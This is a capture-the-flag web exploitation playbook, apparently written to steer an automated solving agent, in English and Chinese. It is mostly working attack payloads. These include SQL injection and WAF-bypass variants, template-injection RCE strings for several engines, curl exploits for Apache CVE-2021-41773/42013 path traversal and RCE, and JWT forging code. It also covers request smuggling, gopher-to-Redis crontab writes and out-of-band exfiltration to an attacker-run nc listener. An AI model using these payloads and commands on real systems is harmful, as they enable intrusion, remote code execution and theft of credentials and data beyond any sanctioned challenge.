# Web playbook (weight 25% — go deep)

Recon → scan → accounts → per-class checklist. For EACH class: probe, confirm,
exploit to flag.

1. **SQLi**: error-based first (`'`, `"`), then UNION (match column count with
   ORDER BY), then boolean/time blind via sqlmap --batch. Dump the table that
   holds flag/admin password.
   **Extraction robustness (run-9115 lesson: admin_logs returned `NORET
   len=1309` for 5+ queries across 9 rounds — the extractor was broken, the
   table was never read; nobody debugged the tool)**:
   - Empty/identical/constant-length extraction output = **your extractor is
     broken**, NOT "the table is empty". Debug the tool before concluding.
   - Fallback ladder when a column won't render: (1) `hex()` the expression
     (`hex(group_concat(...))` — dodges charset/width issues); (2) row-by-row
     `LIMIT n,1` instead of group_concat (long group_concats truncate);
     (3) `SUBSTR(expr,off,200)` paging; (4) `ORD()`/`ASCII()` per-char for the
     stubborn tail; (5) `CHAR()` reassembly.
   - Verify the extractor on a KNOWN value first (`SELECT @@version` through
     the same injection path) — if that doesn't come back, fix the path, don't
     query the real target through a broken pipe.
   - Dump EVERY table before leaving the DB: logs/hosts/config tables are
     where later-stage credentials hide.
2. **SSTI**: `{{7*7}}`, `{{config}}` in every param; Jinja/Twig/Smarty payloads;
   RCE via `''.__class__.__mro__` chain or `system()`.
3. **Command injection**: `;id`, `|id`, `` `id` ``, `$(id)`, newline `%0aid`;
   once confirmed, `cat /flag* /etc/passwd`, `env`, `ls -la /`.
4. **SSRF**: params taking URLs; hit internal `http://127.0.0.1:port`,
   `file:///etc/passwd`, cloud metadata `169.254.169.254`; bypass filters with
   redirects, decimal IP, `@`, dns rebinding alternatives.
5. **Path traversal / LFI**: `../../etc/passwd`, encodings, `....//`, php
   filters `php://filter/convert.base64-encode/resource=`; then RCE via log
   poisoning or session files.
6. **File upload**: webshell with double ext, `.pht/.phtml/.php5`, content-type
   spoof, magic bytes; find upload dir via dir scan.
7. **Deserialization**: PHP `unserialize` (phpggc patterns), Python pickle,
   Java (ysoserial patterns), Node `node-serialize`; JWT session cookies.
8. **XSS→admin**: fuzz `<>"'` filter profile; bypass; jsfuck if all filtered;
   aim for cookie exfil to your listener or stored flag in admin bot.
9. **XXE**: swap JSON→XML bodies; external entities `file://`, phar.
10. **Auth/IDOR (see system.md §4)**: register 2 accounts; enum IDs; role
    tamper; JWT attacks; password reset flow flaws; weak creds (admin/admin,
    hydra on login only if nothing else moves). **Weak-cred lists must be
    THEMED, not just generic**: brand/product/company words from the challenge
    description and page footers × {2023..2026,123,!,@} (e.g. a "泛微" system →
    `Weaver@2023`; "深科" → `deeptech@2023`, `shenke@2024`), plus
    username×suffix (`employee123`, `sysadmin2023`). Challenge passwords come
    from the challenge's own corpus — see playbook_killchain §"Password attack
    standard procedure" for the full candidate recipe.
11. **Info leaks**: `.git/HEAD` → dump repo; `.env`, `actuator/`, `console/`,
    `phpinfo`, source in `.bak/.swp`, verbose errors, debug=True.

Flags hide in: DB rows, files readable after RCE/LFI, admin pages, response
headers of special routes, second-stage internal services (SSRF/pivot).

## Sandboxed / headless-browser XSS (Dalgona, js2py checkers) — read BEFORE grinding XSS

When a challenge renders your input then checks it with a headless browser or a
Python JS engine (js2py) and reports back whether `alert()` fired:

- **DIAGNOSTIC — do not skip.** If EVERY payload returns the SAME response —
  including the literal `1`, `true`, `null`, or a non-JS string — the error is
  coming from the CHECKER's own eval harness, NOT your payload. A real content
  filter changes behavior per-input; an identical response to all inputs is a
  sandbox-engine artifact. STOP fuzzing tag/encoding variants: no amount of
  `<img onerror>` obfuscation fixes a checker that crashes before reading you.
- The signature `TypeError: Attempting to change the setter of an
  unconfigurable property` = the checker does
  `Object.defineProperty(window,'alert',{set:...})` on a non-configurable
  property. This is the open-source **dalgona** XSS trainer (do9duck/dalgona);
  each named variant (Star / Umbrella / Heart / …) has ONE intended solution
  per category.
- **RESEARCH > FUZZ here.** Spend budget pulling the exact variant's checker
  source + known solution from the dalgona repo (this host has internet), then
  craft the single intended payload. Blind fuzzing a crashing checker is a
  guaranteed time sink (cost us 3 challenges this run: 011/015/018).
- js2py is an INCOMPLETE JS engine: it cannot redefine native non-configurable
  accessors, so `Object.defineProperty`, `delete window.alert`, Proxy/Set traps
  all trip the TypeError. The working angle is usually to fire `alert` through
  a path the checker does NOT wrap, or feed input the checker's preamble accepts
  — get the variant's exact template from source first.
- Seed payloads in `tools/payloads/xss_sandbox.txt` (try in order); note
  WHICH tag/char each variant's filter blocks, then wrap the surviving vector.

## Run-6661 iron rules (lost us a-07 — read before any WAF/XXE grind)

- **Bypass found ⇒ re-run EVERY blocked payload through it.** If a WAF
  blocked `<!DOCTYPE`/`php://filter`/`file://` and you later find a bypass
  (UTF-16/UTF-32 body encoding, case tweaks, comments, chunking), IMMEDIATELY
  retry all previously blocked payloads wrapped in the bypass. A payload
  blocked pre-bypass is NOT a dead end (a-07: UTF-16 bypassed the WAF but the
  `php://filter` base64 read was never retried through it → no exfil → fail).
- **Blind vuln without reflection ⇒ OOB to YOUR OWN listener.** The target
  shares your VPN segment and can reach your sandbox IP (`hostname -I`). For
  blind XXE/SSRF/RCE: start `nc -lvp 8888` (or python http.server) locally,
  make the target exfil to `http://<your-ip>:8888/<data>` — via parameter
  entities + external DTD (XXE), URL fetch (SSRF), or curl/wget in executed
  commands. Error-based second best: force file content into error text
  (e.g. PHP `PI php never end` proves a read worked — switch the wrapper
  until content surfaces).
- **Hidden JSON/form field ⇒ brute COMPOUND names, don't hand-guess.** When
  an endpoint answers "URL is required" / "missing field" for every name you
  try, the real key is usually a prefix+noun compound (a-14 died at 132 min
  because it never tried `target_endpoint`). Script it, diff vs the baseline
  error — one pass, not one-by-one:
  ```
  while read -r p; do
    curl -s -X POST "$URL" -H 'Content-Type: application/json' \
         -d "{\"$p\":\"http://127.0.0.1/\"}" | grep -qv "URL is required" \
      && echo "HIT param=$p"
  done < <(python "$HEHUA_ROOT/scripts/paramgen.py" --n 200)
  ```
  (paramgen.py prints seeds first, then prefix×noun snake+camel.)

## Web-server fingerprint → instant CVE (check the `Server:` header FIRST)

- **Apache/2.4.49** → CVE-2021-41773; **Apache/2.4.50** → CVE-2021-42013.
  Path traversal + RCE via DOUBLE-encoded dot-dot. Exact canonical forms —
  `/cgi-bin/` uses the NO-dot `%%32%65%%32%65`; `/icons/` uses `.%%32%65`.
  If single-encoded traversal 404s/400s you MUST try these (the #1 miss):
  ```
  # 2.4.49 read (single-encoded, cgi-bin):
  curl -s --path-as-is "http://T/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  # 2.4.50 read (double-encoded): %%32%65%%32%65 decodes to ..
  curl -s --path-as-is "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
  curl -s --path-as-is "http://T/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
  # 2.4.50 RCE: POST body is piped to /bin/sh (needs mod_cgi + ScriptAlias):
  curl -s --path-as-is -d 'echo; id; cat /flag* /flag.txt /root/flag.txt /challenge/flag.txt 2>/dev/null' \
    "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
  ```
  Also try the `%252e%252e/` variant. RCE needs a CGI-enabled mapped URI
  (ScriptAlias /cgi-bin/); if it 404s, the box may only allow file read.
  Flag at /flag, /flag.txt, /root/flag.txt, or /challenge/flag.txt.
- **Werkzeug/Flask**: probe `/console` (debug shell — if open, RCE via
  `__import__('os').popen('cat /flag*').read()`); SSTI in any reflected param
  (`{{config}}`, `{{7*7}}`); and DEBUG error pages leak source/paths.
- **Flag hygiene**: flags are `flag{...}`. Extract the WHOLE token incl. both
  braces before submitting (`grep -oE 'flag\{[^}]+\}'`); a truncated or
  brace-less string is a wasted submit.

## JS chunk systematic analysis (do BEFORE manual endpoint enumeration — c-03 lesson)

When a Next.js/React/SPA app has no obvious API entry:
1. **Download ALL JS chunks** (not just the ones you see in page source):
   ```bash
   BASE=<target>
   curl -s "$BASE/" | grep -oE '(src|href)="[^"]*\.js"' | cut -d'"' -f2 > urls.txt
   curl -s "$BASE/" | grep -o '/_next/static/chunks/[^"]*\.js' >> urls.txt
   mkdir -p js && sort -u urls.txt | while read p; do
     curl -s -m 10 "$BASE$p" -o "js/$(basename $p)"
   done
   ```
2. **Grep for hidden endpoints and real API addresses**:
   ```bash
   # Hidden backend ports (API might NOT be on the obvious port)
   grep -rho 'localhost:[0-9]*/api\|127\.0\.0\.1:[0-9]*/api\|:500[0-9]/api' js/
   grep -o '.\{100\}localhost:500[0-9].\{150\}' js/*.js  # context around hits
   # API base URLs / config
   grep -rho 'baseURL[^,}]*\|API_BASE[^,}]*\|apiUrl[^,}]*' js/
   # Next.js Server Actions (can call backend directly)
   grep -rlo 'createServerReference\|ACTION_ID\|\$ACTION\|serverActions' js/
   # GraphQL endpoints
   grep -rlo 'graphql\|/gql\|query{' js/ | head -5
   # WebSocket endpoints
   grep -rho 'ws://[^"]*\|wss://[^"]*' js/
   ```
3. **Test discovered endpoints directly** — the JS often reveals the REAL backend
   port (e.g., `localhost:5002/api` in JS when the visible frontend is :3000).
4. **Next.js image optimization SSRF** — if /_next/image exists:
   ```bash
   curl -s "$BASE/_next/image?url=http://localhost:5002/api/secret&w=640&q=75"
   ```

## JWT attacks (when any JWT/token/Authorization header present)

1. **Decode first**:
   ```bash
   echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null  # header (check alg, kid)
   echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null  # payload (check role, email)
   ```
2. **alg:none** (if HS256):
   ```python
   import base64, json
   def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
   header = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
   payload = b64(json.dumps({"email":"dev@example.com","role":"admin"}).encode())
   print(f"{header}.{payload}.")
   ```
3. **kid header attacks**: try kid="dev.key", kid="old.key", kid path traversal
   (kid="../../dev/null"), kid pointing to a known file.
4. **Claim tampering**: change role → admin, email → admin@x.com, add "admin": true.
5. **HMAC key brute** (if weak key): use hashcat/john or python hmac itertools.
6. **Old signing keys**: check if old/migration keys still accepted (dev.key).
7. **PHP/nginx alias traversal** to READ the signing key file:
   `/public/static/../../keys/prod.key` (when "migration" is in the description).

## Contract/Approval/Reimbursement systems (a-03 class)

1. **Register 2+ accounts** (employee + different employee).
2. **Horizontal IDOR**: access other user's contracts/approvals by ID.
   ```bash
   # Get employee A's contract list, try accessing by ID
   curl -b A_cookies "http://T/api/contracts"  # note the IDs
   curl -b B_cookies "http://T/api/contracts/123"  # B reads A's contract?
   ```
3. **Race condition**: submit + approve simultaneously (parallel curl).
4. **Amount tampering**: negative, zero, huge, float overflow, string.
5. **Role escalation**: employee accessing admin/manager endpoints directly.
6. **Batch operations**: bulk endpoints that skip per-item auth checks.
7. **Status manipulation**: change pending→approved via PUT/PATCH.
8. **JS route analysis**: download app JS to find ALL routes including hidden ones.

## HTTP Request Smuggling (when behind proxy/load balancer — envoy, cloudflare)

1. **Identify proxy chain**: check Server/X-Via/CF-Ray headers, OPTIONS behavior.
2. **CL-TE**: Content-Length + Transfer-Encoding chunked together.
3. **TE-CL**: Transfer-Encoding chunked + Content-Length conflict.
4. **Raw socket testing** (python):
   ```python
   import socket
   s = socket.create_connection((HOST, 80))
   s.sendall(b"POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: T\r\n\r\n")
   print(s.recv(4096).decode(errors='replace'))
   ```
5. **envoy→nginx chain**: envoy may normalize paths differently than nginx →
   try path variations that bypass envoy routing but hit nginx backends.



- **LFI as an existence oracle (kills 403/catch-all noise)**: when directory
  brute is polluted — `.htaccess` returning 403 on every dotfile, or a PHP
  catch-all returning the homepage 200 for ANY path — so ffuf can't tell real
  files from noise, repurpose a known LFI/include param (`?file=`, `?page=`,
  `?id=`, `?template=`) as a file-existence probe. Existing vs non-existing
  paths produce DIFFERENT LFI responses (content vs "not found" vs error), so
  diff the response across a wordlist to enumerate the REAL files under
  `/api/`, `/admin/`, etc. that the front router hides. (ATX used this to map
  B-02's hidden `/api/` surface through an .htaccess 403 wall.)
- **.htaccess blocks HTTP requests, NOT LFI reads**: an LFI that "can't read
  config.php because .htaccess denies it" is a misread — read it via the LFI.
- WAF blocks DOCTYPE/entities ⇒ **XInclude XXE** (xmlns:xi inside body, no
  DOCTYPE needed).
- Old nginx + "static service migration" hints ⇒ **nginx alias traversal**
  to read files like JWT signing keys; also try kid=/dev/null, kid path
  traversal before wordlists.
- Python pollution/set_ filters on the KEY STRING ⇒ send the path as a
  **JSON array** (list paths skip string filters); read /src first and attack
  the exact filter.
- Description-disclosed internal endpoints (SSRF targets) ⇒ pivot IMMEDIATELY
  with file/gopher/dict schemes; do not re-discover.
- Go services on internal nets ⇒ **/debug/pprof** and /debug/vars first.
- pydash pollution: pydash≥6 RESTRICTS `__globals__`/`__builtins__` (KeyError
  "restricted" = version ≥6) and does NOT parse bracketed string keys as path
  segments (they become literal attrs) ⇒ the `__file__`-swap read only works
  on OLD pydash; probe version via error text before grinding paths.
- HugeGraph ≤1.2: gremlin SecurityManager blocks file/exec/URL; arthas runs
  inside on 8561/8562 UNEXPOSED ⇒ remaining chain = raw-Socket SSRF from
  gremlin to 127.0.0.1:8561 arthas API (ognl read).
- Gradio 4.12: /component_server needs session_hash+component_id;
  move_resource_to_blocklist 500s (removed) ⇒ prefer /file= with allowed
  /tmp/gradio prefix or upload-path tricks.

## SSTI 深挖（签名/主题/模板预览/个人资料展示 = 服务端渲染面，见即主攻 SSTI）

**触发词**：个人签名/资料展示、文章模板预览、自定义主题渲染、任何"你的输入会被服务端渲染后展示"。

1. **引擎指纹**（先发探测串定位引擎，再上对应 payload）：
   - `${7*7}` → 49: FreeMarker/Velocity(旧)/Mako; `${7*7}` 原样: Thymeleaf 可能
   - `{{7*7}}` → 49: Jinja2/Twig(nunjucks); `{{7*'7'}}` → 7777777 Jinja2, 49 Twig
   - `<%= 7*7 %>` ERB; `#{7*7}` Ruby Slim/Thymeleaf; `*{7*7}` Spring Thymeleaf
   - `{{7*7}}` 报错页看框架名；Bottle 常配 Jinja2（SimpleTemplate 无沙箱）
2. **Jinja2 RCE 链**（`__class__` 被过滤时逐级换）：
   - `{{lipsum.__globals__['os'].popen('cat /flag*').read()}}`（最短，先试）
   - `{{cycler.__init__.__globals__.os.popen('id').read()}}`
   - `{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}`
   - `|attr()` 链绕点号过滤：`{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()...}}`
   - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'os' in str(x) %}{{x.popen('cat /flag*').read()}}{% endif %}{% endfor %}`
3. **其他引擎 RCE**：
   - FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag*")}`
   - Velocity: `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('cat /flag*'))`
   - Twig: `{{['cat /flag*']|map('system')}}` 或 `_self.env.registerUndefinedFilterCallback("exec")` 链
   - ERB(Ruby): `<%= system('cat /flag*') %>` 或 `` <%= `cat /flag*` %> ``
   - Thymeleaf: `__${T(java.lang.Runtime).getRuntime().exec("cat /flag*")}__::..`（URL path 里）
4. **无回显（盲 SSTI）**：`{{7*7}}` 不回显时用时间盲注 `{{ ''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True) }}` 或 OOB：让 payload curl 内网回连；输出重定向到静态目录再 HTTP 读。
5. **过滤绕过**：关键词黑名单（class/os/import）→ 十六进制属性访问 `__class__`→`\x5f\x5fclass\x5f\x5f`、attr 过滤器拼接 `'__cla'+'ss__'`、用 `request`/`session`/`config` 对象替代、`{%%}` 语法替代 `{{}}`。

## WAF 绕过 SQLi 变形矩阵（题面明示"照搬公开 payload 无效"时必读）

按序重放同一注入的变形（一处 WAF 规则挡不全所有形态）：
- 大小写混合 `UnIoN SeLeCt`；内联注释 `UN/**/ION SEL/**/ECT`；URL 双编码 `%2553elect`
- 关键词拆分：`uni%0aon`（换行）、`uni\u006fn`（JSON 体）、`+. ` 拼接（MySQL `UNION/*!12345SELECT*/`版本注释）
- 科学/替代写法：`or` → `||`、`and` → `&&`、空格 → `/**/` `%09` `%0a` `+`
- 无回显走盲注：布尔（`1&&substr(database(),1,1)='x'`）、时间（`1&&sleep(5)`/PG `pg_sleep(5)`）、报错（`extractvalue(1,concat(0x7e,version()))`、PG `::text` cast 报错）
- **python-requests 手写脚本逐字符二分**，别指望 sqlmap 一次过——tamper 链 `tamper=space2comment,between,randomcase,charencode` 逐个试
- WAF 在应用层（统一过滤器）时：找**未过过滤器的参数**（Header X-Forwarded-For/Referer/UA、JSON 嵌套键、数组参数 `id[]=`、路径参数）注入

## Spring Boot 裸应用（无 index 页 = actuator/组件面）

1. `/actuator` `/actuator/env` `/actuator/heapdump` `/actuator/configprops` `/actuator/beans` `/actuator/mappings` `/actuator/trace`(`/httptrace`)
2. **heapdump 是金矿**：下载后 `strings heapdump | grep -iE 'flag|secret|password|jdbc'`，或 MAT/Eclipse 分析（凭据常在 DataSource/连接池对象里）
3. env 泄漏 → 拿到内部凭据打 eureka/nacos/redis；`/actuator/gateway` 有 route 注入 RCE（Spring Cloud Gateway CVE-2022-22947: `POST /actuator/gateway/routes/{id}` SpEL）
4. jolokia（`/actuator/jolokia/list`）→ MBean `ch.qos.logback` JNDI 或 `reloadByURL` file:// RCE 链
5. 报错页 `/error` 看依赖组件版本 → 对应 CVE（fastjson/shiro/log4j 见 playbook_exploit）
6. 没开 actuator：fuzz `/api` `/druid` `/swagger-ui.html` `/v2/api-docs` `/api-docs`（druid 未授权 `/druid/index.html` 直接看 SQL 监控）

## 多租户数据服务越权（Presto/Hive/共享数据库类——盲目猜 flag 前必读）

1. 先枚举系统表：`SHOW TABLES FROM information_schema`、`SELECT * FROM system.metadata.materialized_views`、Presto `system.jdbc.tables`；JMX connector `system.jmx.*` 泄漏配置
2. 租户隔离常在**查询改写层**（Ranger/Sentry 策略或 proxy SQL 改写）而非引擎层 → 试：CRLF/注释截断改写（`/*` 不闭合让改写层和引擎看到不同 SQL）、大小写/同义改写（`catalog.schema.table` 三段全限定名绕 schema 补全）、子查询/CTE/视图嵌套（策略只匹配表层）
3. 函数旁路：`table_sample`、`UNNEST`、`array_agg` 聚合他人行、`ANSI` 模式差异
4. JDBC URL/连接池配置错误 → information_schema 直连其他 catalog：`SELECT * FROM "other-tenant-db".public.users`
5. 错误提交超过 3 次说明在盲猜——停下来 dump information_schema 全表结构再打

## GraphQL 面（见到 /graphql、application/json + query 字段即套用）

1. **内省**：`{__schema{types{name fields{name}}}}` 拿全 schema → 找 admin/secret/flag 字段；内省被禁时：报错建议（故意拼错字段名，错误信息逐字提示候选）、Clairvoyance 字典爆破 schema、抓 JS 里的 query 片段
2. **IDOR 高发**：mutation 参数里的 id 直接改；`user(id:2)`/`node(id:"...")` 换 base64 编码的 ID（`atob/btoa`）
3. **批量/别名绕限**：`alias1: field(...) alias2: field(...)` 单请求打多次，绕速率限制与暴力枚举；**批量 mutation**（数组内并发同操作）打竞态
4. **查询深度 DoS 忎的**，但**循环引用对象**（user.posts.user...）可能把隐藏关系带出来
5. 无鉴权字段直接查：`{flag}` `{secrets}` ——先试字段名再内省（内省可能关了但字段没关）

## LDAP / 目录服务集成（密钥托管/SSO/"企业目录"字样）

1. **LDAP 注入**（登录框/搜索框进 LDAP filter）：`*` 万能（`user=*&password=*`）、
   `*)(uid=*))(|(uid=*` 闭合注入、布尔盲注 `*)(objectClass=*))%00` 逐字符截取属性
2. **用户枚举**：响应差异（时延/文案）区分存在性——目录集成的登录口几乎总有
3. 匿名绑定：空 DN+空密码 `ldapwhoami -x -h host`；默认凭据 `admin/admin`、
   `cn=admin,dc=example,dc=com`
4. Vault/密钥服务形态：`/v1/sys/health` `/v1/sys/mounts` 探未授权；token 在
   env/配置里泄漏后 `VAULT_TOKEN=xxx vault kv get secret/...`；unseal key 泄漏→
   完全接管；LDAP auth 绑定账号的密码常硬编码在配置（读配置文件是正路）

## SSRF 深化：从外层应用到内网数据层

目标形态："机密在不在互联网上的数据库/隔离层"= 必须链式 SSRF：
1. **找 fetch 点**：URL 参数、webhook/回调配置、头像/导入/导出、PDF 生成、
   代理/预览功能、Sitemap/OAuth 回调
2. **内网测绘**：先 127.0.0.1 常见端口（6379 redis / 3306 / 5432 / 27017 /
   8500 consul / 8200 vault / 2375 docker），再扫内网段存活
3. **协议交互**：redis `gopher://` 写 crontab/SSH key；FastCGI `gopher://` RCE；
   dict:// 探端口指纹；`file://` 读配置拿内网拓扑与凭据
4. **盲 SSRF**（无回显）：302 跳转探测（自控页面重定向到目标，按响应码/时延判断）；
   DNS OOB；错误差异（连接拒绝 vs 超时 = 端口开闭）
5. **二次注入**：SSRF 只拿到内网页面 → 页面里再找注入点（内网应用无 WAF，
   一条 SQLi 直取 flag）

## 原型污染 / 类污染（Node"神秘对象行为变化"题；Python 应用同样有 class pollution）

1. **JS 检测**：任何递归 merge/深拷贝/JSON body 直接进对象的地方，发
   `{"__proto__":{"x":"y"}}` 后查 `Object.prototype` 是否被写（回显/行为变化/报错差异）；
   绕过键过滤：`constructor.prototype`（`{"constructor":{"prototype":{"x":1}}}`）
2. **客户端 gadget 链**：污染后找 sink——statusbar/`pollTitle`（旧模板）、
   `config.vars`、`sequence`（DOM XSS），污染 `NODE_OPTIONS`/`shell` 触发 RCE
3. **服务端 sink**（Node）：`child_process` options（污染 `shell:true`+`NODE_OPTIONS=--require=...`）、
   Express `view options`/`views` 改渲染引擎、EJS 的 `outputFunctionName` 直接 RCE、
   `errorHandler` 改函数
4. **Python class pollution**（merge/`setattr` 递归更新用户输入时）：污染
   `__init__.__globals__` 下任意全局（改 `SECRET_KEY`、框架配置），或
   `subprocess.Popen.__init__.__defaults__` 注入 `shell=True`
5. 与其他洞**组合**是主流形态：污染 → 绕权限检查 → SSRF/文件读 → RCE 逐级上链

## Web 缓存投毒/缓存欺骗（有 CDN/缓存头/静态化痕迹时）

1. 识别缓存键：`X-Forwarded-Host`/`X-Original-URL` 等未键入的输入 →
   `curl -H "X-Forwarded-Host: a.@evil" 目标页` 看反射
2. 投毒 gadget：不键入的 header 反射进页面/跳转 → 缓存后打所有访问者；
   unkeyed cookie 同理
3. 缓存欺骗：`/api/me/nonexist.css` 类路径让缓存器存下带凭据的 API 响应
   （路径后缀伪装成静态资源）→ 从缓存读别人会话数据
4. Web cache deception 的变体：`/profile%0a.css`、大小写、`;.js`

## OAuth / OIDC 流程攻击（"用 XX 登录"、callback、state 参数出现时）

1. **redirect_uri 校验缺陷**：`?redirect_uri=evil` / `//evil` / 子域跳板 /
   `redirect_uri=合法#` 截断 / 参数污染 `&redirect_uri=evil`——偷 code/token
2. **state 缺失** → CSRF 绑定别人账号；**PKCE 缺失** → 截 code 自兑
3. **隐式流 token** 进 URL → Referrer/日志泄漏；token 注入 session 固定
4. **账号接管链**：注册同 email → 第三方登录自动绑定已有账号（email 未验证时）
5. **nonce/JWKS 弱点**：`alg:none`/`HS256 密钥混淆`（拿公钥当 HMAC 密钥签 token）；
   `kid` 注入路径穿越指自建 JWK

## HTTP 方法篡改与动词越权（2025 高频形态）

1. 被 403 的路径换动词：`GET /admin` 403 → `HEAD`/`POST`/`PATCH`/`OPTIONS`/`CONNECT`
   逐个试；`X-HTTP-Method-Override: DELETE` 头覆盖
2. 路径变形绕路由 ACL：`//admin`、`/admin/.`、`/;/admin`、`/%2e/admin`、
   `..;/admin`（Tomcat/Java 高发）、大小写、尾部 `/.` 与 `%00`
3. HTTP/1.0 短接、绝对 URI（`GET http://host/admin`）绕反代路径规则
4. CORS 预检绕过：`Content-Type: text/plain` 发 JSON；`X-Requested-With` 删掉

## WebSocket 攻击面（页面有 ws:// / wss:// / 长连接时）

1. CSWSH：跨站 WebSocket 劫持——无 Origin 校验时带 cookie 从恶意页连 ws，
   构造 `new WebSocket("wss://target/ws")`
2. 消息注入：抓协议格式后改 id/角色/命令字段（IDOR over ws）；
   重放+并发打竞态
3. 鉴权缺失：直接裸连 ws 端点发订阅消息读他人数据
4. 消息解析漏洞：JSON 深层原型污染、二进制解析内存破坏（配 reversing）
